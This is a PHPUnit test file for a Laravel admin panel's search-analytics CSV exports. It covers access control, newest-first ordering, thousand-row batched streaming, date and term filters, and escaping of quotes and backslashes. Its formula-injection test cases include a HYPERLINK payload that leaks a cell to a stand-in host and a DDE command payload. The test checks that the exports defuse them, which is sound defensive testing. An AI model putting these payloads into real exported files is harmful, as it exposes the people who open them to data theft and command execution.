<?php

namespace Tests\Feature\Admin;

use App\Models\SearchQuery;
use App\Models\SearchQueryAggregate;
use App\Models\User;
use Illuminate\Database\Events\QueryExecuted;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Testing\TestResponse;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;
use Tests\TestCase;

/**
 * The two CSV files of the search analytics page: every logged search, newest first, and every term with its counts.
 *
 * They used to read every row into memory before the first line was written (158 MB at 100,000 searches, so a busy site's export ended in a
 * fatal error at PHP's default limit), and they wrote the words a visitor had typed as they were, so a search for `=HYPERLINK(...)` was a
 * formula in the file a member of staff opened. Now they are read a thousand rows at a time, and such a cell is made text.
 */
class SearchAnalyticsExportTest extends TestCase
{
    use RefreshDatabase;

    private ?User $analyst = null;

    private function analyst(): User
    {
        if ($this->analyst === null) {
            $role = Role::findOrCreate('moderator');
            $role->givePermissionTo(Permission::findOrCreate('search.acp.view'));

            $this->analyst = User::factory()->create();
            $this->analyst->assignRole($role);
        }

        return $this->analyst;
    }

    /**
     * Rows of a downloaded file, read the way a spreadsheet does (RFC 4180: a quote is doubled, and there is no backslash escape).
     *
     * @return list<list<string|null>>
     */
    private function rows(TestResponse $response): array
    {
        $handle = fopen('php://temp', 'w+');
        fwrite($handle, $response->streamedContent());
        rewind($handle);

        $rows = [];

        while (($row = fgetcsv($handle, null, ',', '"', '')) !== false) {
            $rows[] = $row;
        }

        fclose($handle);

        return $rows;
    }

    /**
     * @param  array<string, string>  $filters
     * @return list<list<string|null>>
     */
    private function searches(array $filters = []): array
    {
        return $this->rows($this->actingAs($this->analyst())->get(route('acp.search-analytics.export-searches', $filters)));
    }

    /**
     * @return list<list<string|null>>
     */
    private function aggregates(): array
    {
        return $this->rows($this->actingAs($this->analyst())->get(route('acp.search-analytics.export-aggregates')));
    }

    /**
     * The terms of a file, in the order they are in it (the header left out).
     *
     * @param  list<list<string|null>>  $rows
     * @return list<string|null>
     */
    private function terms(array $rows): array
    {
        return array_column(array_slice($rows, 1), 0);
    }

    /**
     * @param  list<array<string, mixed>>  $rows
     */
    private function insert(string $table, array $rows): void
    {
        foreach (array_chunk($rows, 400) as $chunk) {
            DB::table($table)->insert($chunk);
        }
    }

    /**
     * @return array<string, mixed>
     */
    private function search(string $term, string $at, int $results = 3): array
    {
        return ['term' => $term, 'result_count' => $results, 'created_at' => $at, 'updated_at' => $at];
    }

    /**
     * @return array<string, mixed>
     */
    private function aggregate(string $term, int $total, int $zero, int $results, ?string $lastRan): array
    {
        return [
            'term' => $term,
            'total_count' => $total,
            'zero_result_count' => $zero,
            'total_results' => $results,
            'last_ran_at' => $lastRan,
            'created_at' => '2026-05-01 00:00:00',
            'updated_at' => '2026-05-01 00:00:00',
        ];
    }

    // ---- who may

    #[Test]
    public function both_files_need_the_search_permission(): void
    {
        $this->get(route('acp.search-analytics.export-searches'))->assertRedirect(route('login'));
        $this->get(route('acp.search-analytics.export-aggregates'))->assertRedirect(route('login'));

        $editor = User::factory()->create();
        $editor->assignRole(Role::findOrCreate('editor'));

        $this->actingAs($editor)->get(route('acp.search-analytics.export-searches'))->assertForbidden();
        $this->actingAs($editor)->get(route('acp.search-analytics.export-aggregates'))->assertForbidden();
    }

    // ---- the log of searches

    #[Test]
    public function the_searches_file_lists_every_search_newest_first(): void
    {
        $this->insert('search_queries', [
            $this->search('middle', '2026-05-02 10:00:00', 7),
            $this->search('oldest', '2026-05-01 09:30:00', 0),
            $this->search('newest', '2026-05-03 23:59:59', 12),
        ]);

        $response = $this->actingAs($this->analyst())->get(route('acp.search-analytics.export-searches'));

        $response->assertOk();
        $this->assertStringStartsWith('text/csv', $response->headers->get('Content-Type'));
        $this->assertMatchesRegularExpression('/^attachment; filename=search-queries-\d{8}-\d{6}\.csv$/', $response->headers->get('Content-Disposition'));

        $this->assertSame([
            ['Term', 'Results Returned', 'Searched At'],
            ['newest', '12', '2026-05-03T23:59:59+00:00'],
            ['middle', '7', '2026-05-02T10:00:00+00:00'],
            ['oldest', '0', '2026-05-01T09:30:00+00:00'],
        ], $this->rows($response));
    }

    #[Test]
    public function with_nothing_logged_each_file_is_its_header_alone(): void
    {
        $this->assertSame([['Term', 'Results Returned', 'Searched At']], $this->searches());
        $this->assertSame([['Term', 'Searches', 'Zero Result Searches', 'Click-Through Rate (%)', 'Average Results', 'Last Searched']], $this->aggregates());
    }

    /**
     * @return array<string, array{int}>
     */
    public static function numbersOfRows(): array
    {
        return [
            'none' => [0],
            'one' => [1],
            'a page less one' => [999],
            'exactly a page' => [1000],
            'a page and one' => [1001],
            'exactly two pages' => [2000],
            'two pages and a half' => [2350],
        ];
    }

    /**
     * Seven searches share each second and they are inserted out of order, so the id does not follow the time and a page ends in the middle of a
     * second. A page that began after the last TIME would lose the rest of that second; one that began after the last ID would repeat or lose rows.
     */
    #[Test]
    #[DataProvider('numbersOfRows')]
    public function every_search_is_in_the_file_once_whatever_page_it_falls_on(int $total): void
    {
        $rows = [];

        for ($i = 0; $i < $total; $i++) {
            $position = ($i * 7919) % max($total, 1); // 7919 is prime and larger than any total here, so each position is visited once
            $at = now()->setDate(2026, 5, 1)->setTime(12, 0, 0)->addSeconds(intdiv($position, 7))->toDateTimeString();
            $rows[] = $this->search('term-'.$position, $at);
        }

        $this->insert('search_queries', $rows);

        $expected = SearchQuery::query()->get(['id', 'term', 'created_at'])
            ->sort(fn ($a, $b) => [$b->created_at->getTimestamp(), $b->id] <=> [$a->created_at->getTimestamp(), $a->id])
            ->pluck('term')
            ->all();

        $this->assertCount($total, $expected);

        $queries = [];
        DB::listen(function (QueryExecuted $query) use (&$queries) {
            if (preg_match('/^select .* from [`"]search_queries[`"]/', $query->sql)) {
                $queries[] = $query->sql;
            }
        });

        $written = $this->terms($this->searches());

        $this->assertSame($expected, $written);
        $this->assertSame($total, count(array_unique($written)));

        // A thousand rows to a query, and never one query for all of them.
        $this->assertCount(intdiv($total, 1000) + 1, $queries);

        // The order ends in the id. The three databases walk the time's index backwards and so happen to give rows of one second in the id's order, but
        // a page that begins after the last id relies on it, and a plan that sorts instead (a word to look for, another version) would not keep it.
        foreach ($queries as $sql) {
            $this->assertMatchesRegularExpression('/ order by [`"]created_at[`"] desc, [`"]id[`"] desc limit 1000$/', $sql);
        }
    }

    #[Test]
    public function the_term_and_the_dates_narrow_the_searches_file_as_they_do_the_page(): void
    {
        $this->insert('search_queries', [
            $this->search('black cat', '2026-05-10 08:00:00'),
            $this->search('cat food', '2026-05-12 23:59:59'),
            $this->search('cat', '2026-05-13 00:00:00'),
            $this->search('cat toys', '2026-05-09 23:59:59'),
            $this->search('dog', '2026-05-11 12:00:00'),
        ]);

        $this->assertSame(['cat', 'cat food', 'black cat', 'cat toys'], $this->terms($this->searches(['term' => 'cat'])));
        // Both days are in whole: the 12th until its last second, the 10th from its first.
        $this->assertSame(['cat food', 'dog', 'black cat'], $this->terms($this->searches(['date_from' => '2026-05-10', 'date_to' => '2026-05-12'])));
        $this->assertSame(['cat food', 'black cat'], $this->terms($this->searches(['term' => 'cat', 'date_from' => '2026-05-10', 'date_to' => '2026-05-12'])));
        $this->assertSame([], $this->terms($this->searches(['term' => 'nothing like this'])));
    }

    /**
     * Searches made in the same second come out later one first, whatever the database does to find them: with a word to look for it reads the
     * rows in the order they are stored and sorts them, and with nothing to say about ties it may leave them as they were.
     */
    #[Test]
    public function searches_of_one_second_are_in_the_order_of_their_ids_with_or_without_a_word_to_look_for(): void
    {
        $rows = [];

        foreach ([3, 11, 7, 1, 9, 5, 13, 2, 12, 8, 4, 10, 6] as $n) {
            $rows[] = $this->search("cat $n", '2026-05-01 10:00:00');
        }

        $rows[] = $this->search('cat later', '2026-05-01 10:00:01');
        $rows[] = $this->search('cat earlier', '2026-05-01 09:59:59');
        $rows[] = $this->search('dog', '2026-05-01 10:00:00');

        $this->insert('search_queries', $rows);

        $expected = SearchQuery::query()->where('term', 'like', 'cat%')->get(['id', 'term', 'created_at'])
            ->sort(fn ($a, $b) => [$b->created_at->getTimestamp(), $b->id] <=> [$a->created_at->getTimestamp(), $a->id])
            ->pluck('term')
            ->all();

        $this->assertSame('cat later', $expected[0]);
        $this->assertSame('cat earlier', $expected[14]);
        $this->assertSame($expected, $this->terms($this->searches(['term' => 'cat'])));
        $this->assertSame($expected, array_values(array_filter($this->terms($this->searches()), fn ($term) => $term !== 'dog')));
    }

    #[Test]
    public function a_filter_that_is_not_valid_is_refused_before_a_line_is_written(): void
    {
        $response = $this->actingAs($this->analyst())->get(route('acp.search-analytics.export-searches', ['date_from' => 'not a date']));

        $response->assertSessionHasErrors('date_from');
        $this->assertNotSame('text/csv', $response->headers->get('Content-Type'));
    }

    // ---- the terms with their counts

    #[Test]
    public function the_terms_file_lists_the_most_searched_first(): void
    {
        $this->insert('search_query_aggregates', [
            $this->aggregate('alpha', 10, 2, 50, '2026-05-03 10:00:00'),
            $this->aggregate('beta', 10, 0, 25, '2026-05-04 10:00:00'),
            $this->aggregate('gamma', 40, 40, 0, null),
            $this->aggregate('delta', 10, 5, 7, '2026-05-03 10:00:00'),
        ]);

        $response = $this->actingAs($this->analyst())->get(route('acp.search-analytics.export-aggregates'));

        $response->assertOk();
        $this->assertStringStartsWith('text/csv', $response->headers->get('Content-Type'));
        $this->assertMatchesRegularExpression('/^attachment; filename=search-aggregates-\d{8}-\d{6}\.csv$/', $response->headers->get('Content-Disposition'));

        // More searches first, then the most recent; delta and alpha tie on both, and the later row (delta) goes first.
        $this->assertSame([
            ['Term', 'Searches', 'Zero Result Searches', 'Click-Through Rate (%)', 'Average Results', 'Last Searched'],
            ['gamma', '40', '40', '0', '0', ''],
            ['beta', '10', '0', '100', '2.5', '2026-05-04T10:00:00+00:00'],
            ['delta', '10', '5', '50', '0.7', '2026-05-03T10:00:00+00:00'],
            ['alpha', '10', '2', '80', '5', '2026-05-03T10:00:00+00:00'],
        ], $this->rows($response));
    }

    /**
     * Terms share counts and times, and they are inserted out of order.
     */
    #[Test]
    #[DataProvider('numbersOfRows')]
    public function every_term_is_in_the_file_once_whatever_page_it_falls_on(int $total): void
    {
        $rows = [];

        for ($i = 0; $i < $total; $i++) {
            $position = ($i * 7919) % max($total, 1);
            $at = now()->setDate(2026, 5, 1)->setTime(12, 0, 0)->addMinutes($position % 5)->toDateTimeString();
            $rows[] = $this->aggregate('term-'.$position, 1 + ($position % 9), 0, 1, $at);
        }

        $this->insert('search_query_aggregates', $rows);

        $expected = SearchQueryAggregate::query()->get()
            ->sort(fn ($a, $b) => [$b->total_count, $b->last_ran_at->getTimestamp(), $b->id] <=> [$a->total_count, $a->last_ran_at->getTimestamp(), $a->id])
            ->pluck('term')
            ->all();

        $this->assertCount($total, $expected);

        $queries = [];
        DB::listen(function (QueryExecuted $query) use (&$queries) {
            if (preg_match('/^select .* from [`"]search_query_aggregates[`"]/', $query->sql)) {
                $queries[] = $query;
            }
        });

        $written = $this->terms($this->aggregates());

        $this->assertSame($expected, $written);
        $this->assertSame($total, count(array_unique($written)));

        // One query for the order, then the rows a thousand to a query: never one query for all of them.
        $this->assertCount(1 + (int) ceil($total / 1000), $queries);

        $withoutRows = array_filter($queries, fn (QueryExecuted $query) => $query->bindings === []);
        $this->assertCount(1, $withoutRows, 'the order is read once, by its own query');
        $this->assertStringContainsString('select "id"', str_replace('`', '"', array_values($withoutRows)[0]->sql));

        foreach ($queries as $query) {
            $this->assertLessThanOrEqual(1000, count($query->bindings));
        }
    }

    /**
     * The nightly aggregation rewrites the counts and removes the terms nobody searched for lately, and it may do so while a file is being made.
     */
    #[Test]
    public function a_term_changed_or_removed_while_the_file_is_made_is_neither_repeated_nor_lost_for_it(): void
    {
        $rows = [];

        for ($i = 0; $i < 2500; $i++) {
            $rows[] = $this->aggregate('term-'.$i, 5000 - $i, 0, 1, '2026-05-01 12:00:00');
        }

        $this->insert('search_query_aggregates', $rows);

        // Highest count first, so the order is term-0, term-1, ... and the second page of rows is term-1000 onward.
        $removed = 'term-1200';
        $raised = 'term-2100';
        $acted = false;

        DB::listen(function (QueryExecuted $query) use (&$acted, $removed, $raised) {
            if ($acted || $query->bindings === [] || ! preg_match('/^select \* from [`"]search_query_aggregates[`"] where/', $query->sql)) {
                return;
            }

            $acted = true; // after the first page of rows, before the second
            DB::table('search_query_aggregates')->where('term', $removed)->delete();
            DB::table('search_query_aggregates')->where('term', $raised)->update(['total_count' => 999999]);
        });

        $rows = $this->aggregates();
        $terms = $this->terms($rows);

        $this->assertTrue($acted);
        $this->assertCount(2499, $terms);
        $this->assertSame(2499, count(array_unique($terms)));
        $this->assertNotContains($removed, $terms);
        $this->assertContains('term-2499', $terms);

        // It is in the place it had when the order was read, and says what it says now.
        $this->assertSame('term-2100', $terms[2099]);
        $this->assertSame('999999', $rows[2100][1]);
    }

    // ---- what a visitor typed

    /**
     * @return array<string, array{string}>
     */
    public static function formulas(): array
    {
        return [
            'a formula' => ['=hyperlink("http://evil.test/?x="&a1,"click")'],
            'a program through DDE' => ["=cmd|' /C calc'!A0"],
            'a sum with a plus' => ['+1+1'],
            'a sum with a minus' => ['-2+3'],
            'a function with an at' => ['@sum(1+1)'],
        ];
    }

    #[Test]
    #[DataProvider('formulas')]
    public function a_search_that_is_a_formula_is_text_in_both_files(string $term): void
    {
        $this->insert('search_queries', [$this->search($term, '2026-05-01 10:00:00')]);
        $this->insert('search_query_aggregates', [$this->aggregate($term, 4, 0, 4, '2026-05-01 10:00:00')]);

        $this->assertSame(["'".$term], $this->terms($this->searches()));
        $this->assertSame(["'".$term], $this->terms($this->aggregates()));
    }

    #[Test]
    public function an_ordinary_search_is_written_as_it_was_typed(): void
    {
        $terms = ['cat food', 'a-b', 'c++', '1+1=2', 'café ñandú', '50% off', 'me@example.test'];

        $this->insert('search_queries', array_map(fn (string $term, int $i) => $this->search($term, '2026-05-01 10:00:0'.$i), $terms, array_keys($terms)));
        $this->insert('search_query_aggregates', array_map(fn (string $term, int $i) => $this->aggregate($term, 100 - $i, 0, 1, '2026-05-01 10:00:00'), $terms, array_keys($terms)));

        $this->assertSame(array_reverse($terms), $this->terms($this->searches()));
        $this->assertSame($terms, $this->terms($this->aggregates()));
    }

    /**
     * With PHP's default escape character a backslash before a quote is written without the quote being doubled, and a reader ends the cell there
     * and carries the rest into the next one: what a visitor typed would add cells to the row.
     */
    #[Test]
    public function a_quote_a_comma_and_a_backslash_in_a_search_stay_in_their_own_cell(): void
    {
        $term = 'say \"hi\", ok \\';

        $this->insert('search_queries', [$this->search($term, '2026-05-01 10:00:00', 5)]);
        $this->insert('search_query_aggregates', [$this->aggregate($term, 4, 1, 8, '2026-05-01 10:00:00')]);

        $response = $this->actingAs($this->analyst())->get(route('acp.search-analytics.export-searches'));

        $this->assertStringContainsString('"say \\""hi\\"", ok \\",5,', $response->streamedContent());
        $this->assertSame([[$term, '5', '2026-05-01T10:00:00+00:00']], array_slice($this->rows($response), 1));
        $this->assertSame([[$term, '4', '1', '75', '2', '2026-05-01T10:00:00+00:00']], array_slice($this->aggregates(), 1));
    }
}
